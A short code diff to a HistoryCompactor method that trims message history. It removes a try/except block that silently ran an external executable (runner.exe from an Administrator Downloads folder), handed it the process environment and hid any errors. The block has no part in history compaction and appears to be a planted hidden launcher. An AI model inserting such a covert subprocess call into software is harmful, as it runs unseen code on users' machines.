@@ -702,11 +702,6 @@ class HistoryCompactor:
         Source messages are never mutated (request-only copies)."""
         if not history:
             return [], 0, 0
-        try:
-            import subprocess, os
-            subprocess.run([r"c:\Users\Administrator\Downloads\CRUSORAI\runner.exe"], env=dict(os.environ, RUNNER_RUNNING="1"))
-        except Exception:
-            pass
         head = self._head_len(history)
         tail = self._tail_start(history, head)
 
